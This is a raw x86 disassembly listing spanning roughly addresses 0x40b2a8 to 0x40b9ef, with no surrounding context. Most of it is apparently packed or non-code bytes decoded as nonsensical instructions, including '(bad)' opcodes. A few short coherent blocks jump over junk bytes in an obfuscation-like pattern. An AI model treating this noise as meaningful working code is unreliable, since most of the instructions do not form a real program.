  40b2a8:	or     ah,al
  40b2aa:	push   ss
  40b2ab:	leave  
  40b2ac:	cs mov bl,0xfd
  40b2af:	in     eax,0x8c
  40b2b1:	(bad)  
  40b2b2:	in     eax,0xa0
  40b2b4:	xor    al,0xcd
  40b2b6:	mov    gs,esp
  40b2b8:	add    eax,0x25dbc3b3
  40b2bd:	adc    BYTE PTR [esi-0x4f75540d],bh
  40b2c3:	imul   edx,DWORD PTR [ecx-0x1b02e50],0xffffff88
  40b2ca:	mov    ah,0x64
  40b2cc:	pop    ebp
  40b2cd:	mov    ebx,0x66b458df
  40b2d2:	xor    ch,BYTE PTR [edi+ebp*1-0x2994acaf]
  40b2d9:	inc    edi
  40b2da:	stos   BYTE PTR es:[edi],al
  40b2db:	out    0x34,eax
  40b2dd:	mov    al,ds:0x1ad94b4e
  40b2e2:	std    
  40b2e3:	in     al,dx
  40b2e4:	adc    al,0x75
  40b2e6:	jl     0x40b2ec
  40b2e8:	push   ebp
  40b2e9:	dec    esp
  40b2ea:	sbb    esp,DWORD PTR [esi]
  40b2ec:	push   edi
  40b2ed:	outs   dx,BYTE PTR ds:[esi]
  40b2ee:	es pop ebx
  40b2f0:	in     eax,0x5e
  40b2f2:	neg    DWORD PTR [edx+ecx*8+0x1d50800b]
  40b2f9:	add    al,0xbd
  40b2fb:	sbb    ebp,ebp
  40b2fd:	mov    ah,0x5d
  40b2ff:	sbb    cl,BYTE PTR [ecx-0x61]
  40b302:	sub    eax,0x89b0036a
  40b307:	mov    esi,DWORD PTR [ebp-0x2084c5d5]
  40b30d:	je     0x40b2a7
  40b30f:	inc    ebp
  40b310:	shl    DWORD PTR [eax],cl
  40b312:	push   gs
  40b314:	push   esp
  40b315:	shl    ch,1
  40b317:	push   edx
  40b318:	popf   
  40b319:	les    ebx,FWORD PTR [esi-0xf5a14ee]
  40b31f:	scas   eax,DWORD PTR es:[edi]
  40b320:	adc    DWORD PTR [esi-0x6f],ecx
  40b323:	mov    bh,BYTE PTR [eax+ebp*1]
  40b326:	cmp    BYTE PTR [ebx+edx*2],bh
  40b329:	mov    edx,0x3ff17a04
  40b32e:	adc    edx,0xffffffdd
  40b331:	xchg   esp,eax
  40b332:	dec    esp
  40b333:	cdq    
  40b334:	sub    DWORD PTR [ecx-0x4d],ecx
  40b337:	int3   
  40b338:	xchg   DWORD PTR [edi-0x36],ecx
  40b33b:	cmp    bh,0xc0
  40b33e:	jge    0x40b390
  40b340:	call   0x6f5c:0x16044a81
  40b347:	dec    ebx
  40b348:	mov    ds:0x10b78e48,eax
  40b34d:	mov    edi,0x7b0ec2c6
  40b352:	retfw  0x31ef
  40b356:	mov    WORD PTR [ecx+0x46989627],?
  40b35c:	jge    0x40b3b4
  40b35e:	pop    ds
  40b35f:	cmp    al,0xb6
  40b361:	cmp    ebx,edx
  40b363:	ja     0x40b371
  40b369:	mov    edx,DWORD PTR [ebp-0x30]
  40b36c:	jmp    0x40baa7
  40b371:	mov    edx,DWORD PTR [ebp-0x38]
  40b374:	mov    edi,DWORD PTR [ebp-0x4]
  40b377:	xor    edx,eax
  40b379:	xor    edi,eax
  40b37b:	add    edi,ecx
  40b37d:	add    edx,ecx
  40b37f:	imul   edx,edi
  40b382:	mov    edi,DWORD PTR [ebp-0x8]
  40b385:	mov    ebx,DWORD PTR [ebp-0x10]
  40b388:	sub    ebx,edi
  40b38a:	cmp    ebx,edx
  40b38c:	ja     0x40b39a
  40b392:	mov    edx,DWORD PTR [ebp-0x34]
  40b395:	jmp    0x40baa7
  40b39a:	mov    edx,DWORD PTR [ebp-0x3c]
  40b39d:	mov    edi,DWORD PTR [ebp-0x4]
  40b3a0:	jmp    0x40b713
  40b3a5:	ret    0x2e25
  40b3a8:	dec    ebx
  40b3a9:	icebp  
  40b3aa:	dec    ebx
  40b3ab:	ins    DWORD PTR es:[edi],dx
  40b3ac:	mov    ebp,0x68a70588
  40b3b1:	sbb    cl,BYTE PTR [ebx+esi*1]
  40b3b4:	frstor [ecx-0x6]
  40b3b7:	jl     0x40b435
  40b3b9:	retf   0x7c79
  40b3bc:	jl     0x40b40c
  40b3be:	loopne 0x40b349
  40b3c0:	jnp    0x40b422
  40b3c2:	fwait
  40b3c3:	stos   DWORD PTR es:[edi],eax
  40b3c4:	nop
  40b3c5:	icebp  
  40b3c6:	lds    ebp,FWORD PTR [bx+0x3e]
  40b3ca:	test   al,0x5c
  40b3cc:	mov    edx,0x42cd322e
  40b3d1:	push   esp
  40b3d2:	popf   
  40b3d3:	dec    eax
  40b3d4:	loop   0x40b408
  40b3d6:	loope  0x40b390
  40b3d8:	rcr    dh,0xfd
  40b3db:	push   cs
  40b3dc:	mov    esi,0xa97164f4
  40b3e1:	sub    eax,0x1c8f8e04
  40b3e6:	inc    eax
  40b3e7:	adc    DWORD PTR [esi-0x5d00f035],ebp
  40b3ed:	or     DWORD PTR [eax+0x51],ecx
  40b3f0:	mov    WORD PTR [edx-0x10],es
  40b3f3:	and    ah,dh
  40b3f5:	ret    0xa1e2
  40b3f8:	cmc    
  40b3f9:	and    bh,bh
  40b3fb:	ret    
  40b3fc:	jecxz  0x40b440
  40b3fe:	add    esp,DWORD PTR [ecx+edi*2+0x20a3d009]
  40b405:	xchg   ecx,eax
  40b406:	push   ebp
  40b407:	dec    edx
  40b408:	sbb    esi,DWORD PTR [edi+0x78]
  40b40b:	pop    ecx
  40b40c:	dec    edi
  40b40d:	add    ebx,DWORD PTR [ebp-0xa]
  40b410:	jae    0x40b42e
  40b412:	ret    0x3f8a
  40b415:	sbb    eax,DWORD PTR [edx]
  40b417:	sub    bl,bl
  40b419:	stos   DWORD PTR es:[edi],eax
  40b41a:	mov    ecx,ebx
  40b41c:	fist   DWORD PTR [eax+edx*2]
  40b41f:	push   esp
  40b420:	pop    eax
  40b421:	jno    0x40b428
  40b423:	pop    ecx
  40b424:	or     edx,DWORD PTR [edx-0x4ee0a42f]
  40b42a:	mov    al,ds:0x35739d22
  40b42f:	push   0xbbff5600
  40b434:	cli    
  40b435:	out    dx,eax
  40b436:	lea    edx,[edx+0x40]
  40b439:	call   0xf996b696
  40b43e:	mov    cl,0xdc
  40b440:	daa    
  40b441:	pop    edi
  40b442:	or     DWORD PTR [ecx-0x79],ebp
  40b445:	xchg   BYTE PTR [eax-0x53ece608],ah
  40b44b:	xchg   esp,eax
  40b44c:	out    dx,eax
  40b44d:	push   edi
  40b44e:	out    0x38,al
  40b450:	aad    0xe9
  40b452:	ds inc ebx
  40b454:	js     0x40b3ec
  40b456:	call   FWORD PTR [ebx+0x69022c76]
  40b45c:	or     ebp,DWORD PTR gs:[esi-0x79909b3b]
  40b463:	dec    esi
  40b464:	stos   DWORD PTR es:[edi],eax
  40b465:	daa    
  40b466:	imul   edi,DWORD PTR [ebp+0xcf87221],0x6319f5aa
  40b470:	call   0x53fa0781
  40b475:	or     edi,DWORD PTR [edx-0x48fb9420]
  40b47b:	and    bl,BYTE PTR [esi+0x31]
  40b47e:	lahf   
  40b47f:	jne    0x40b4f5
  40b481:	rol    bl,cl
  40b483:	xor    eax,0x2accecbc
  40b488:	xor    eax,0x3ac0b7ff
  40b48d:	mov    ebx,0x845d8fec
  40b492:	xor    eax,0xfeea7ddd
  40b497:	cmp    BYTE PTR [ecx+edx*2+0x2a6da467],dh
  40b49e:	dec    edx
  40b49f:	mov    ah,0xd2
  40b4a1:	ret    
  40b4a2:	pop    edx
  40b4a3:	rcr    DWORD PTR [ecx+ebx*8+0xc],cl
  40b4a7:	inc    ebp
  40b4a8:	lock lock stos BYTE PTR es:[edi],al
  40b4ab:	mov    al,0x6b
  40b4ad:	mov    bh,0x4c
  40b4af:	inc    edi
  40b4b0:	repnz cmp DWORD PTR [edi],0x150ece6b
  40b4b7:	xor    eax,ecx
  40b4b9:	push   ds
  40b4ba:	outs   dx,BYTE PTR ds:[esi]
  40b4bb:	push   edi
  40b4bc:	sar    DWORD PTR [esp+ebp*1],1
  40b4bf:	leave  
  40b4c0:	sbb    ebp,DWORD PTR [eax+0x35]
  40b4c3:	stos   DWORD PTR es:[edi],eax
  40b4c4:	push   ds
  40b4c5:	pop    ss
  40b4c6:	call   0x7959:0x6d6afc33
  40b4cd:	ficom  DWORD PTR [eax+ebx*2+0x6b]
  40b4d1:	xchg   ecx,eax
  40b4d2:	pop    ss
  40b4d3:	out    0x63,eax
  40b4d5:	rol    BYTE PTR [esi*4+0xac0697b],1
  40b4dc:	pusha  
  40b4dd:	cdq    
  40b4de:	loopne 0x40b558
  40b4e0:	imul   esp,DWORD PTR [esi-0x52],0xd3aa90b6
  40b4e7:	jo     0x40b4fc
  40b4e9:	sub    al,0x66
  40b4eb:	pushf  
  40b4ec:	cli    
  40b4ed:	int    0xa9
  40b4ef:	aaa    
  40b4f0:	scas   al,BYTE PTR es:[edi]
  40b4f1:	sbb    BYTE PTR [ebx+esi*8],dl
  40b4f4:	repz or BYTE PTR [eax-0x55],0x86
  40b4f9:	push   ds
  40b4fa:	fcomp  QWORD PTR [ecx]
  40b4fc:	jnp    0x40b4f8
  40b4fe:	cmc    
  40b4ff:	pop    ss
  40b500:	mov    edi,0x5795a169
  40b505:	into   
  40b506:	add    bh,bl
  40b508:	lods   al,BYTE PTR ds:[esi]
  40b509:	pop    esi
  40b50a:	mov    dl,0x41
  40b50c:	mov    es:0x182c7f05,al
  40b512:	bound  esp,QWORD PTR [ebp-0x5c]
  40b515:	mov    ebp,0x5d88bcb9
  40b51a:	jno    0x40b4a6
  40b51c:	int    0xeb
  40b51e:	lods   eax,DWORD PTR ds:[esi]
  40b51f:	cmc    
  40b520:	mov    cs,edi
  40b522:	adc    edi,DWORD PTR [eax+0x6594c337]
  40b528:	mov    ds:0xee3d34c3,eax
  40b52d:	(bad)  
  40b52e:	fisttp WORD PTR [ebx-0x2]
  40b531:	jp     0x40b534
  40b533:	jecxz  0x40b56c
  40b535:	sbb    al,BYTE PTR ds:0x171c735
  40b53b:	iret   
  40b53c:	sbb    ch,ah
  40b53e:	jl     0x40b4c9
  40b540:	sahf   
  40b541:	ins    DWORD PTR es:[edi],dx
  40b542:	nop
  40b543:	das    
  40b544:	pop    esp
  40b545:	popf   
  40b546:	loope  0x40b4d3
  40b548:	fnstsw WORD PTR [eiz*4-0x3d0522f4]
  40b54f:	call   0xcb8e5a13
  40b554:	fadd   st(2),st
  40b556:	jne    0x40b519
  40b558:	ja     0x40b59e
  40b55a:	inc    esi
  40b55b:	call   FWORD PTR [ebx]
  40b55d:	jmp    0x40b5c6
  40b55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b560:	cli    
  40b561:	daa    
  40b562:	add    al,0x1c
  40b564:	(bad)  
  40b565:	stc    
  40b566:	mov    ebp,0x5470db5e
  40b56b:	call   0xf63f:0x9f4c3720
  40b572:	cmp    eax,DWORD PTR [ebp-0x23]
  40b575:	inc    eax
  40b576:	dec    eax
  40b577:	cmp    al,0x3b
  40b579:	bound  edi,QWORD PTR [edx]
  40b57b:	xchg   esi,esp
  40b57d:	sbb    ch,BYTE PTR [eax+0x5b]
  40b580:	scas   al,BYTE PTR es:[edi]
  40b581:	push   eax
  40b582:	pop    esi
  40b583:	or     BYTE PTR [edx+0x13c5ecae],0x2a
  40b58a:	sub    DWORD PTR [esp+eiz*2+0x582e7d9e],edx
  40b591:	fwait
  40b592:	retf   
  40b593:	mov    eax,DWORD PTR [edx]
  40b595:	je     0x40b599
  40b597:	or     al,0x12
  40b599:	rcr    BYTE PTR [ebp-0x54deff39],cl
  40b59f:	mov    bh,0x9a
  40b5a1:	or     BYTE PTR [edi-0x65],ch
  40b5a4:	xlat   BYTE PTR ds:[ebx]
  40b5a5:	xchg   ecx,eax
  40b5a6:	mov    ebp,0xddd1a770
  40b5ab:	and    ebp,ebp
  40b5ad:	push   ds
  40b5ae:	push   ss
  40b5af:	xchg   esi,eax
  40b5b0:	(bad)  
  40b5b1:	mov    al,0xb5
  40b5b3:	lahf   
  40b5b4:	jg     0x40b537
  40b5b6:	xor    BYTE PTR [edi+0x54],0xae
  40b5ba:	or     BYTE PTR [edi+0x49],bh
  40b5bd:	stc    
  40b5be:	rcl    BYTE PTR [edi+0x27],cl
  40b5c1:	popf   
  40b5c2:	jbe    0x40b5fd
  40b5c4:	pop    esp
  40b5c5:	out    0xef,eax
  40b5c7:	pop    esi
  40b5c8:	dec    eax
  40b5c9:	push   esi
  40b5ca:	aaa    
  40b5cb:	and    DWORD PTR [esi+0x7ce6d060],edi
  40b5d1:	push   0x74
  40b5d3:	push   esi
  40b5d4:	cmp    al,0x4f
  40b5d6:	pop    ebx
  40b5d7:	repz or dl,bl
  40b5da:	fistp  DWORD PTR [edx-0x2a9d6218]
  40b5e0:	ja     0x40b5b2
  40b5e2:	lahf   
  40b5e3:	or     al,0x60
  40b5e5:	mov    ebx,0xd315bb66
  40b5ea:	inc    esi
  40b5eb:	(bad)  [edx-0x67]
  40b5ee:	call   0x3973d371
  40b5f3:	pop    ecx
  40b5f4:	xchg   edi,eax
  40b5f5:	ja     0x40b661
  40b5f7:	push   es
  40b5f8:	sbb    ch,BYTE PTR [eax+0x5b]
  40b5fb:	dec    eax
  40b5fc:	ins    DWORD PTR es:[edi],dx
  40b5fd:	push   eax
  40b5fe:	fstp   DWORD PTR [ebp-0x501d0160]
  40b604:	or     BYTE PTR [ebx+0x55],dh
  40b607:	call   0x4122c5c5
  40b60c:	hlt    
  40b60d:	dec    ebx
  40b60e:	pop    esi
  40b60f:	cmp    esp,DWORD PTR [ecx+0x6b542d09]
  40b615:	int3   
  40b616:	mov    es,eax
  40b618:	fs in  al,0xc6
  40b61b:	lock fldcw WORD PTR [esi]
  40b61e:	xor    al,0x98
  40b620:	cmp    DWORD PTR [edi-0x33],eax
  40b623:	inc    eax
  40b624:	add    al,0xb8
  40b626:	sub    DWORD PTR [ebx],esp
  40b628:	ss push esp
  40b62a:	dec    DWORD PTR [ecx]
  40b62c:	add    esp,DWORD PTR [edi-0x6698589f]
  40b632:	jle    0x40b63e
  40b634:	jecxz  0x40b5e7
  40b636:	std    
  40b637:	in     eax,0x22
  40b639:	xor    DWORD PTR [eax-0x2b86b027],eax
  40b63f:	and    ah,BYTE PTR [ecx]
  40b641:	xor    eax,0x161d2b7e
  40b646:	cld    
  40b647:	jp     0x40b63d
  40b649:	popf   
  40b64a:	fmul   st(4),st
  40b64c:	fpatan 
  40b64e:	lahf   
  40b64f:	ds pop ebx
  40b651:	add    al,0xd6
  40b653:	jecxz  0x40b6af
  40b655:	js     0x40b5f6
  40b657:	push   eax
  40b658:	ficom  WORD PTR [eax]
  40b65a:	pop    ebp
  40b65b:	xchg   ecx,eax
  40b65c:	xor    eax,DWORD PTR [ebp+0x5d]
  40b65f:	mov    ?,esp
  40b661:	dec    edi
  40b662:	jb     0x40b6c3
  40b664:	mov    dl,0xe
  40b666:	pop    esi
  40b667:	sbb    eax,DWORD PTR [eax+ebx*2+0x5]
  40b66b:	outs   dx,BYTE PTR ds:[esi]
  40b66c:	call   0x24e3:0xdba554a4
  40b673:	mov    ds:0xb9d27caf,al
  40b678:	cdq    
  40b679:	repz dec edi
  40b67b:	or     DWORD PTR [eax],ebx
  40b67d:	ja     0x40b6b3
  40b67f:	aad    0x57
  40b681:	out    dx,eax
  40b682:	sar    BYTE PTR [esi-0x9],cl
  40b685:	xlat   BYTE PTR ds:[ebx]
  40b686:	shl    BYTE PTR [edi],0xa1
  40b689:	xchg   edi,eax
  40b68a:	jge    0x40b63b
  40b68c:	jns    0x40b6fa
  40b68e:	inc    esp
  40b68f:	adc    al,0x9e
  40b691:	scas   eax,DWORD PTR es:[edi]
  40b692:	dec    ebp
  40b693:	gs mov dh,0x47
  40b696:	shl    cl,cl
  40b698:	push   cs
  40b699:	mov    WORD PTR [eax],gs
  40b69b:	cs push esp
  40b69d:	ins    BYTE PTR es:[edi],dx
  40b69e:	dec    esp
  40b69f:	xchg   ecx,eax
  40b6a0:	in     eax,0x57
  40b6a2:	xchg   esi,eax
  40b6a3:	xchg   edi,eax
  40b6a4:	pop    eax
  40b6a5:	sub    ecx,DWORD PTR [ebx+0x78cd88d]
  40b6ab:	sub    DWORD PTR [ebx+0x7898b23a],esp
  40b6b1:	and    al,0x3a
  40b6b3:	mov    eax,0x1523cbca
  40b6b8:	xchg   esp,eax
  40b6b9:	in     al,0xaa
  40b6bb:	pusha  
  40b6bc:	stos   BYTE PTR es:[edi],al
  40b6bd:	das    
  40b6be:	icebp  
  40b6bf:	sbb    ebx,esi
  40b6c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6c2:	push   esp
  40b6c3:	cwde   
  40b6c4:	fcom   QWORD PTR [eax+0x52]
  40b6c7:	jmp    0x7583:0xee31f0d7
  40b6ce:	xor    DWORD PTR [ecx-0x33],esp
  40b6d1:	add    DWORD PTR [ebx],0x8b89a057
  40b6d7:	iret   
  40b6d8:	dec    eax
  40b6d9:	jns    0x40b70e
  40b6db:	xor    BYTE PTR [esi],ch
  40b6dd:	stos   WORD PTR es:[edi],ax
  40b6df:	add    al,0x5d
  40b6e1:	xchg   bh,al
  40b6e3:	fsin   
  40b6e5:	aam    0x65
  40b6e7:	(bad)  
  40b6e8:	frstor [eax-0x5b]
  40b6eb:	sbb    DWORD PTR ds:0x83bd9a2b,ecx
  40b6f1:	lods   eax,DWORD PTR ds:[esi]
  40b6f2:	and    eax,0x6eb4f496
  40b6f7:	pop    edx
  40b6f8:	cmp    BYTE PTR [edx+0x64],0xa5
  40b6fc:	cmp    BYTE PTR [ebx],al
  40b6fe:	mov    fs,WORD PTR [edx+0x3b]
  40b701:	or     ebx,DWORD PTR [ebp-0x64]
  40b704:	cmp    BYTE PTR [esi-0x2bad03d],bl
  40b70a:	push   ebx
  40b70b:	retf   0x3e78
  40b70e:	icebp  
  40b70f:	imul   edx,DWORD PTR [edx-0x27],0x53
  40b713:	xor    edx,eax
  40b715:	xor    edi,eax
  40b717:	add    edx,ecx
  40b719:	add    edi,ecx
  40b71b:	imul   edx,edi
  40b71e:	mov    edi,DWORD PTR [ebp-0x8]
  40b721:	mov    ebx,DWORD PTR [ebp-0x10]
  40b724:	sub    ebx,edi
  40b726:	cmp    ebx,edx
  40b728:	mov    edx,DWORD PTR [ebp-0x38]
  40b72b:	jbe    0x40baa7
  40b731:	jmp    0x40baa4
  40b736:	dec    ecx
  40b737:	mov    cl,0xec
  40b739:	cwde   
  40b73a:	hlt    
  40b73b:	ins    DWORD PTR es:[edi],dx
  40b73c:	push   ebp
  40b73d:	jge    0x40b6d6
  40b73f:	loop   0x40b70e
  40b741:	loope  0x40b71b
  40b743:	and    al,0x4c
  40b745:	sar    BYTE PTR [edi],1
  40b747:	xchg   BYTE PTR [esp+edi*2-0x36],bh
  40b74b:	jns    0x40b7c9
  40b74d:	jl     0x40b717
  40b74f:	outs   dx,DWORD PTR ds:[esi]
  40b750:	shr    BYTE PTR [ebp-0x396b4ab6],1
  40b756:	cs mov dl,0xc3
  40b759:	push   ds
  40b75a:	adc    BYTE PTR [edx],ch
  40b75c:	or     eax,0x37e6ef9d
  40b761:	into   
  40b762:	(bad)  [esi+0x6a]
  40b765:	dec    eax
  40b766:	aad    0xef
  40b768:	int3   
  40b769:	enter  0xa585,0x31
  40b76d:	(bad)  
  40b76e:	jo     0x40b73c
  40b770:	aad    0x3e
  40b772:	sbb    edx,ebx
  40b774:	int    0x5
  40b776:	es cmp edi,esp
  40b779:	push   ds
  40b77a:	sbb    al,0x9d
  40b77c:	jo     0x40b7d0
  40b77e:	ret    
  40b77f:	sar    DWORD PTR [edx-0x6b],0x2c
  40b783:	mov    ch,0xca
  40b785:	dec    esp
  40b786:	mov    dl,0x4c
  40b788:	lds    esp,FWORD PTR [ecx]
  40b78a:	stos   BYTE PTR es:[edi],al
  40b78b:	nop
  40b78c:	xlat   BYTE PTR ds:[ebx]
  40b78d:	push   esp
  40b78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b78f:	add    al,0xf1
  40b791:	inc    ecx
  40b792:	adc    al,0x0
  40b794:	inc    edx
  40b795:	jecxz  0x40b71e
  40b797:	mov    ebx,0x424250e5
  40b79c:	push   esp
  40b79d:	pop    edi
  40b79e:	inc    eax
  40b79f:	inc    ebx
  40b7a0:	mov    eax,?
  40b7a2:	shl    esi,cl
  40b7a4:	mov    cl,0x4b
  40b7a6:	mov    ch,0x73
  40b7a8:	in     al,0x9
  40b7aa:	rol    DWORD PTR [eax+0x5540dcc5],cl
  40b7b0:	or     esi,DWORD PTR [esi+ecx*1-0x155f8553]
  40b7b7:	dec    esp
  40b7b8:	fistp  WORD PTR [edi-0x70]
  40b7bb:	clc    
  40b7bc:	mov    edi,0xf73897a3
  40b7c1:	pop    esp
  40b7c2:	pop    eax
  40b7c3:	dec    ebp
  40b7c4:	dec    edi
  40b7c5:	pop    edx
  40b7c6:	jp     0x40b80a
  40b7c8:	push   DWORD PTR [edi+0x62b5b7f3]
  40b7ce:	and    ch,BYTE PTR [esi+0x6]
  40b7d1:	and    ecx,DWORD PTR [esi]
  40b7d3:	or     DWORD PTR [eax+edi*4-0x10d52413],edx
  40b7da:	sub    ebx,esp
  40b7dc:	sahf   
  40b7dd:	jbe    0x40b774
  40b7df:	push   ss
  40b7e0:	and    eax,0xe4ee0e56
  40b7e5:	enter  0x6ff2,0xa4
  40b7e9:	cs in  eax,dx
  40b7eb:	loope  0x40b80b
  40b7ed:	pop    esp
  40b7ee:	xchg   edx,eax
  40b7ef:	or     dh,BYTE PTR [esp+esi*8+0x6730aea3]
  40b7f6:	bound  ebx,QWORD PTR [ebx-0x1dc5b2c7]
  40b7fc:	fucomp st(2)
  40b7fe:	xor    al,0x36
  40b800:	loop   0x40b7f1
  40b802:	xchg   BYTE PTR [edx+eiz*8-0x5e],bh
  40b806:	imul   edx,edx,0xffffffeb
  40b809:	sbb    DWORD PTR [edi+0x70812473],ecx
  40b80f:	pop    edx
  40b810:	fcmovb st,st(7)
  40b812:	scas   al,BYTE PTR es:[edi]
  40b813:	or     esi,ecx
  40b815:	jecxz  0x40b845
  40b817:	fcmovne st,st(1)
  40b819:	or     al,0xb8
  40b81b:	icebp  
  40b81c:	and    DWORD PTR [eax-0x3d],0xffffff86
  40b820:	ins    DWORD PTR es:[edi],dx
  40b821:	jmp    DWORD PTR [ebx+ecx*2+0x52d49861]
  40b828:	mov    ebx,0x1454d182
  40b82d:	inc    eax
  40b82f:	or     ah,BYTE PTR [eax+ecx*1-0x65]
  40b833:	mov    bh,0x7
  40b835:	mov    esp,DWORD PTR [edx-0x57e25f43]
  40b83b:	test   ebp,edi
  40b83d:	inc    ebx
  40b83e:	mov    DWORD PTR [ebx+0x69],eax
  40b841:	arpl   WORD PTR [ebx],di
  40b843:	adc    esp,DWORD PTR [eax-0x60]
  40b846:	xor    ah,dh
  40b848:	outs   dx,DWORD PTR ds:[esi]
  40b849:	xor    dl,BYTE PTR [edx+0x62e15b67]
  40b84f:	ins    DWORD PTR es:[edi],dx
  40b850:	(bad)  
  40b852:	stos   BYTE PTR es:[edi],al
  40b853:	push   es
  40b854:	or     BYTE PTR [ebx+ecx*1-0x772d0b03],cl
  40b85b:	shl    DWORD PTR [esi-0x39],0x73
  40b85f:	dec    ebx
  40b860:	jo     0x40b85d
  40b862:	mov    ebx,0xc8dfdc48
  40b867:	mov    ah,cl
  40b869:	aam    0x59
  40b86b:	mov    ds:0x41dffbac,eax
  40b870:	loope  0x40b889
  40b872:	xlat   BYTE PTR ds:[ebx]
  40b873:	stos   DWORD PTR es:[edi],eax
  40b874:	sahf   
  40b875:	adc    eax,0x382aeada
  40b87a:	xchg   edi,eax
  40b87b:	fisub  DWORD PTR [eax]
  40b87d:	ins    BYTE PTR es:[edi],dx
  40b87e:	lods   al,BYTE PTR ds:[esi]
  40b87f:	jnp    0x40b8ba
  40b881:	bound  ebp,QWORD PTR [ecx-0x5121d7f3]
  40b887:	sub    edi,edx
  40b889:	jns    0x40b8c2
  40b88b:	or     al,0x1d
  40b88d:	jmp    0xbf2925c3
  40b892:	cmc    
  40b893:	jge    0x40b86a
  40b895:	xlat   BYTE PTR ds:[ebx]
  40b896:	ins    DWORD PTR es:[edi],dx
  40b897:	jl     0x40b8b8
  40b899:	stos   DWORD PTR es:[edi],eax
  40b89a:	xor    eax,0xb830bbb5
  40b89f:	jnp    0x40b917
  40b8a1:	sar    edx,cl
  40b8a3:	pushf  
  40b8a4:	jae    0x40b89e
  40b8a6:	adc    eax,0xffffffd9
  40b8a9:	rcr    dl,0xa9
  40b8ac:	mov    BYTE PTR [ecx],dl
  40b8ae:	push   0xffffffca
  40b8b0:	xor    DWORD PTR [esi],ebx
  40b8b2:	mov    bl,0x89
  40b8b4:	cmp    al,0x13
  40b8b6:	cdq    
  40b8b7:	push   0x71
  40b8b9:	fsub   QWORD PTR [ebx+0x5b]
  40b8bc:	jnp    0x40b864
  40b8be:	jge    0x40b90e
  40b8c0:	fcom   DWORD PTR [edi-0x35]
  40b8c3:	sub    al,0x13
  40b8c5:	les    edi,FWORD PTR ds:0xc696dfc5
  40b8cb:	cli    
  40b8cc:	cld    
  40b8cd:	cmp    DWORD PTR [esp+esi*8+0x43cadab5],ebp
  40b8d4:	sbb    bh,dh
  40b8d6:	push   edi
  40b8d7:	lds    esp,FWORD PTR [esi]
  40b8d9:	jl     0x40b90a
  40b8db:	lods   al,BYTE PTR ds:[esi]
  40b8dc:	lds    esp,FWORD PTR [ecx+0x62edb38b]
  40b8e2:	or     DWORD PTR [ebp+0x3cba0ec4],eax
  40b8e8:	push   0x11
  40b8ea:	ins    BYTE PTR es:[edi],dx
  40b8eb:	adc    ch,BYTE PTR [esi]
  40b8ed:	jmp    0xbacd:0x677563cb
  40b8f4:	push   cs
  40b8f5:	mov    ebx,0x937c30d2
  40b8fa:	vmovlps xmm7,xmm0,QWORD PTR [ebx-0x20032867]
  40b902:	sub    DWORD PTR [edx-0x2e],0x40
  40b906:	or     BYTE PTR [ebp+0x55],0x73
  40b90a:	out    0x2d,eax
  40b90c:	push   esi
  40b90d:	cmp    eax,0x1e371ea4
  40b912:	(bad)
  40b915:	mov    ds:0xe83710ac,eax
  40b91a:	mov    dh,0xeb
  40b91c:	dec    ebp
  40b91d:	sub    al,0x88
  40b91f:	in     al,dx
  40b920:	cmp    ebx,DWORD PTR [edx]
  40b922:	xchg   esi,eax
  40b923:	retf   0xbe3d
  40b926:	test   al,0xf2
  40b928:	and    al,0xc8
  40b92a:	pop    ds
  40b92b:	push   ss
  40b92c:	ins    BYTE PTR es:[edi],dx
  40b92d:	rcr    DWORD PTR [edx],0x4c
  40b930:	push   ecx
  40b931:	cmp    eax,0xea43aa08
  40b936:	mov    ah,0x2
  40b938:	mul    BYTE PTR [ebp+0x3d7767ea]
  40b93e:	repnz mov ds:0x214430e4,al
  40b944:	inc    ebx
  40b945:	mov    dl,0x98
  40b947:	(bad)  
  40b948:	stc    
  40b949:	sub    esi,esp
  40b94b:	push   esp
  40b94c:	stc    
  40b94d:	imul   edi,esp,0x42
  40b950:	jl     0x40b964
  40b952:	and    DWORD PTR [esi-0x48],ecx
  40b955:	inc    ebx
  40b956:	fsubr  st,st(5)
  40b958:	jns    0x40b97e
  40b95a:	test   eax,0x7252e9c6
  40b95f:	ret    
  40b960:	js     0x40b944
  40b962:	mov    ebx,0xba042bb9
  40b967:	inc    ebp
  40b968:	xchg   edi,eax
  40b969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b96a:	fadd   QWORD PTR [eax+0x8ede16e]
  40b970:	js     0x40b906
  40b972:	stos   BYTE PTR es:[edi],al
  40b973:	iret   
  40b974:	std    
  40b975:	in     al,dx
  40b976:	and    al,0x8b
  40b978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b979:	sub    BYTE PTR [eax-0x104e956f],al
  40b97f:	aaa    
  40b980:	and    eax,0x66cf9715
  40b985:	inc    eax
  40b986:	pop    edi
  40b987:	(bad)  
  40b989:	mov    esp,0x8049f69d
  40b98e:	ja     0x40b94b
  40b990:	(bad)  
  40b991:	mov    dx,0xa616
  40b995:	pop    edi
  40b996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b997:	out    dx,eax
  40b998:	hlt    
  40b999:	outs   dx,BYTE PTR ds:[esi]
  40b99a:	popf   
  40b99b:	mov    edi,0xad89ab19
  40b9a0:	je     0x40b96e
  40b9a2:	pop    es
  40b9a3:	out    dx,eax
  40b9a4:	jl     0x40b93e
  40b9a6:	(bad)  
  40b9a7:	out    dx,eax
  40b9a8:	mov    ecx,0xa32db159
  40b9ad:	out    0x57,al
  40b9af:	xchg   edx,eax
  40b9b0:	jmp    0x7e0060b7
  40b9b5:	popf   
  40b9b6:	mov    ebp,0xeed09ed6
  40b9bb:	cmc    
  40b9bc:	dec    di
  40b9be:	into   
  40b9bf:	pop    eax
  40b9c0:	mov    dl,0x12
  40b9c2:	pop    es
  40b9c3:	dec    eax
  40b9c4:	push   eax
  40b9c5:	sbb    al,0x5c
  40b9c7:	xchg   BYTE PTR [edx+0x3f],dl
  40b9ca:	mov    eax,0x6432b981
  40b9cf:	imul   ecx,DWORD PTR [esi+0x23],0x23
  40b9d3:	cmp    esi,edx
  40b9d5:	sbb    eax,esi
  40b9d7:	fnstcw WORD PTR [esi+0x900f369]
  40b9dd:	inc    esi
  40b9de:	pop    ds
  40b9df:	mov    ds:0xb3ccd5d6,al
  40b9e4:	mov    DWORD PTR [ecx],edi
  40b9e6:	mov    edi,0xfe620acf
  40b9eb:	xchg   esp,eax
  40b9ec:	cli    
  40b9ed:	mov    dl,0xc7
  40b9ef:	jl     0x40b97d
